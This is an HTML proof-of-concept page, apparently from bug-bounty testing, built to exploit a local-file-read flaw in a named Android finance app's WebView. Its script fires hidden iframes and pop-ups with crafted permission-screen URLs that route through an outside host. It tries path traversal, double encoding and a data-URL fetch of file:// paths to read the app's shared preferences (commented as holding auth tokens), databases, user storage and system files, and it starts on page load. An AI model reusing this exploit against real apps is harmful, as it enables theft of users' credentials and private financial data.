<!DOCTYPE html>
<html>
<head>
    <title>Local File Read Exploit</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #000; color: #00ff00; }
        .result { border: 2px solid #ff0000; padding: 15px; margin: 10px 0; background: #111; }
        button { background: #ff0000; color: white; padding: 15px; border: none; margin: 5px; cursor: pointer; }
        pre { background: #222; color: #fff; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>üîì Local File Read Exploit</h1>
    <p>Testing local file access via isHtmlView=true&htmlFilePath=</p>
    
    <button onclick="readAppFiles()">üì± Read App Files</button>
    <button onclick="readSystemFiles()">‚öôÔ∏è Read System Files</button>
    <button onclick="readUserFiles()">üë§ Read User Files</button>
    <button onclick="readDatabaseFiles()">üíæ Read Database Files</button>
    
    <div id="results"></div>

    <script>
        function addResult(title, content) {
            const div = document.createElement('div');
            div.className = 'result';
            div.innerHTML = `<h3>${title}</h3><div>${content}</div>`;
            document.getElementById('results').appendChild(div);
        }

        function readAppFiles() {
            console.log("Attempting to read app files...");
            
            const appFiles = [
                "/android_asset/config.json",
                "/android_asset/cd-offer-details.json", 
                "/android_asset/dashboard_response_mocked.json",
                "/data/data/in.groww.dash/shared_prefs/",
                "/data/data/in.groww.dash/files/",
                "/data/data/in.groww.dash/cache/"
            ];
            
            appFiles.forEach((file, index) => {
                setTimeout(() => {
                    const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(file)}`;
                    
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = readUrl;
                    document.body.appendChild(iframe);
                    
                    console.log(`Attempting to read: ${file}`);
                    
                    setTimeout(() => {
                        try { document.body.removeChild(iframe); } catch(e) {}
                    }, 5000);
                }, index * 1000);
            });
            
            addResult("üì± App Files", "Attempting to read application files and configs");
        }

        function readSystemFiles() {
            console.log("Attempting to read system files...");
            
            const systemFiles = [
                "/proc/version",
                "/system/build.prop",
                "/proc/cpuinfo",
                "/proc/meminfo",
                "/etc/hosts",
                "/proc/net/arp"
            ];
            
            systemFiles.forEach((file, index) => {
                setTimeout(() => {
                    // Try direct file:// access through htmlFilePath
                    const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=file://${file}`;
                    
                    window.open(readUrl, `_blank_${index}`);
                    console.log(`Attempting to read: ${file}`);
                }, index * 1500);
            });
            
            addResult("‚öôÔ∏è System Files", "Attempting to read system configuration files");
        }

        function readUserFiles() {
            console.log("Attempting to read user files...");
            
            const userFiles = [
                "/storage/emulated/0/Download/",
                "/storage/emulated/0/Documents/",
                "/storage/emulated/0/Pictures/",
                "/storage/emulated/0/Android/data/in.groww.dash/",
                "/sdcard/Android/data/in.groww.dash/files/"
            ];
            
            userFiles.forEach((file, index) => {
                setTimeout(() => {
                    const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(file)}`;
                    
                    // Try both iframe and direct navigation
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = readUrl;
                    document.body.appendChild(iframe);
                    
                    console.log(`Attempting to read: ${file}`);
                }, index * 800);
            });
            
            addResult("üë§ User Files", "Attempting to read user storage and app data");
        }

        function readDatabaseFiles() {
            console.log("Attempting to read database files...");
            
            const dbFiles = [
                "/data/data/in.groww.dash/databases/",
                "/data/data/in.groww.dash/shared_prefs/com.groww.dash_preferences.xml",
                "/data/data/in.groww.dash/shared_prefs/encrypted_prefs.xml",
                "/data/data/in.groww.dash/files/user_data.json"
            ];
            
            dbFiles.forEach((file, index) => {
                setTimeout(() => {
                    // Multiple attack vectors for database access
                    const methods = [
                        `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(file)}`,
                        `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=file://${file}`,
                        `https://credit.groww.in/pl/permission-screen?webViewUrl=data:text/html,<script>fetch('file://${file}').then(r=>r.text()).then(console.log)</script>`
                    ];
                    
                    methods.forEach((method, methodIndex) => {
                        setTimeout(() => {
                            const iframe = document.createElement('iframe');
                            iframe.style.display = 'none';
                            iframe.src = method;
                            document.body.appendChild(iframe);
                            
                            console.log(`DB access method ${methodIndex + 1}: ${file}`);
                        }, methodIndex * 500);
                    });
                }, index * 2000);
            });
            
            addResult("üíæ Database Files", "Attempting to read app databases and preferences");
        }

        // Enhanced file read with different techniques
        function enhancedFileRead() {
            const sensitiveFiles = [
                // SharedPreferences (contains auth tokens!)
                "/data/data/in.groww.dash/shared_prefs/com.groww.dash_preferences.xml",
                "/data/data/in.groww.dash/shared_prefs/encrypted_prefs.xml", 
                
                // App config files
                "/android_asset/cd-offer-details.json",
                "/android_asset/dashboard_response_mocked.json",
                
                // Potential log files
                "/data/data/in.groww.dash/files/logs/",
                "/storage/emulated/0/Android/data/in.groww.dash/files/"
            ];
            
            sensitiveFiles.forEach(file => {
                // Try multiple encoding techniques
                const encodedFile = encodeURIComponent(file);
                const doubleEncodedFile = encodeURIComponent(encodedFile);
                
                const attackUrls = [
                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodedFile}`,
                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${doubleEncodedFile}`,
                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=../${encodedFile}`,
                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=file://${file}`
                ];
                
                attackUrls.forEach(url => {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = url;
                    document.body.appendChild(iframe);
                });
            });
        }

        // Auto-start with most promising targets
        window.addEventListener('load', function() {
            setTimeout(() => {
                console.log("Auto-starting file read tests...");
                
                // Test most likely to work: app assets
                const testFile = "/android_asset/cd-offer-details.json";
                const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(testFile)}`;
                
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = readUrl;
                document.body.appendChild(iframe);
                
                addResult("üöÄ Auto Test", `Attempting to read: ${testFile}`);
                
                // Try enhanced techniques
                setTimeout(() => enhancedFileRead(), 3000);
            }, 2000);
        });
    </script>
</body>
</html>
